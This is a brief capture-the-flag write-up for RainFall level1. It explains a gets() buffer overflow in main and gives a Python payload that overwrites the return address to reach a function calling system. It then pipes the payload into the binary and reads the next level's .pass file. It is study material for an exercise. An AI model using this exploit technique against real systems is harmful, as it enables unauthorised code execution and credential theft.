To exploit the buffer overflow of the function gets in the main function
The basic problem is that the function doesn't know how big the buffer is, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given

there are 2 methods: main & run
main:
buffer size = 80
run:
call system

to execute run:
- python -c 'print "k"*76 + "\x60\x83\x04\x08"' > /tmp/payload
- level1@RainFall:~$ cat /tmp/payload - | ./level1
Good... Wait what?
cat /home/user/level2/.pass

exit
